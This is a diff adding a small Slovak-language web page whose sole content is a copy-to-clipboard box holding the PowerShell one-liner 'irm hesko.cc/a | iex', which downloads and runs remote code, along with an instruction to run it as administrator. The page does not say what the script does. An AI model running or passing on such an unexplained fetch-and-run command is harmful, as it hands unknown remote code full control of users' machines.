@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="sk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PowerShell Script</title>
+    <style>
+        :root {
+            --bg: #0c0c0d;
+            --panel: #111113;
+            --text: #e6e6e8;
+            --muted: #b6b6bb;
+            --accent: #e11d2e;
+            --border: #1e1f22;
+            --radius: 14px;
+            --shadow: 0 10px 30px rgba(0,0,0,.35);
+            --font: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, Ubuntu, Cantarell, "Noto Sans", "Helvetica Neue", Arial, "Apple Color Emoji", "Segoe UI Emoji";
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background: linear-gradient(180deg, #0a0a0a 0%, #0e0e10 100%);
+            color: var(--text);
+            font-family: var(--font);
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+            text-rendering: optimizeLegibility;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .command-box {
+            background: linear-gradient(180deg, #111113, #0f0f11);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 24px 32px;
+            box-shadow: var(--shadow);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 16px;
+            display: inline-block;
+            min-width: 400px;
+        }
+
+        .command-box:hover {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 2px rgba(225, 29, 46, 0.18);
+            transform: translateY(-2px);
+        }
+
+        .command-text {
+            font-family: 'Courier New', monospace;
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text);
+            user-select: none;
+            letter-spacing: 0.5px;
+        }
+
+        .instruction {
+            color: var(--muted);
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 8px;
+        }
+
+        .copied-notification {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: var(--accent);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-weight: 700;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            z-index: 1000;
+        }
+
+        .copied-notification.show {
+            opacity: 1;
+        }
+
+        @media (max-width: 520px) {
+            .command-box {
+                min-width: auto;
+                width: 100%;
+                padding: 20px 24px;
+            }
+            
+            .command-text {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="command-box" onclick="copyToClipboard()">
+            <div class="command-text">irm hesko.cc/a | iex</div>
+        </div>
+        <div class="instruction">spustiť v powershelly ako admin</div>
+    </div>
+
+    <div class="copied-notification" id="notification">
+        Skopírované!
+    </div>
+
+    <script>
+        function copyToClipboard() {
+            const text = "irm hesko.cc/a | iex";
+            
+            navigator.clipboard.writeText(text).then(function() {
+                showNotification();
+            }).catch(function(err) {
+                // Fallback pre starší prehliadače
+                const textArea = document.createElement("textarea");
+                textArea.value = text;
+                document.body.appendChild(textArea);
+                textArea.focus();
+                textArea.select();
+                try {
+                    document.execCommand('copy');
+                    showNotification();
+                } catch (err) {
+                    console.error('Chyba pri kopírovaní:', err);
+                }
+                document.body.removeChild(textArea);
+            });
+        }
+
+        function showNotification() {
+            const notification = document.getElementById('notification');
+            notification.classList.add('show');
+            
+            setTimeout(function() {
+                notification.classList.remove('show');
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
